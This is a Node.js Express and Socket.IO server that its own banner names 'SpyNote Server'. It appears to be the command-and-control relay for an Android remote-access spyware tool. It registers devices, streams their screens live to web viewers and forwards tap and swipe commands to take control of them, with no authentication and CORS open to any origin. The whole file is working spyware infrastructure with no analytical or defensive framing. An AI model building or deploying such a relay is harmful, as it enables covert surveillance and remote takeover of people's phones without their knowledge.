const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 20000,
    pingInterval: 10000,
    maxHttpBufferSize: 200 * 1024 * 1024 // 🔥 200MB for frames
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '200mb' }));
app.use(express.urlencoded({ limit: '200mb', extended: true }));

const devices = new Map();
const viewers = new Map(); // Web clients watching devices

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/register', (req, res) => {
    const { deviceId, model, brand, version, status } = req.body;
    if (deviceId) {
        devices.set(deviceId, { model, brand, version, status, connected: true });
        console.log("✅ Device registered:", deviceId);
    }
    res.json({ success: true });
});

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

// 🔥 FIXED SOCKET RELAY
io.on('connection', (socket) => {
    console.log('🔌 Client connected:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true, 
                socketId: socket.id 
            });
            socket.join(deviceId);
            socket.broadcast.emit('devices-update', Array.from(devices.entries()));
            console.log("📱 Device LIVE:", deviceId);
        }
    });

    // 🔥 FIXED: Screen frame relay to ALL viewers
    socket.on('screen-frame', (data) => {
        const deviceId = data.deviceId;
        if (devices.has(deviceId)) {
            // Broadcast to ALL clients in device room (viewers)
            socket.broadcast.to(deviceId).emit('screen-update', {
                deviceId,
                data: data.data,
                width: data.width,
                height: data.height,
                timestamp: data.timestamp,
                fps: data.fps
            });
            
            // Debug every 60 frames
            if (data.timestamp % 2000 < 33) {
                console.log(`📺 ${deviceId.slice(0,8)} → ${data.data.length/1024|0}KB | ${data.fps}FPS`);
            }
        }
    });

    // 🔥 Control commands
    socket.on('control', (data) => {
        const { deviceId, action, x, y, startX, startY, endX, endY } = data;
        if (devices.has(deviceId)) {
            // Send to device only
            io.to(deviceId).emit('control', data);
            console.log(`🎮 ${action} → ${deviceId.slice(0,8)}`);
        }
    });

    socket.on('disconnect', () => {
        // Update device status
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                io.emit('devices-update', Array.from(devices.entries()));
                console.log('📱 Device OFFLINE:', deviceId);
                break;
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 SpyNote Server: http://localhost:${PORT}`);
    console.log(`📱 Ready for screen streaming!`);
});
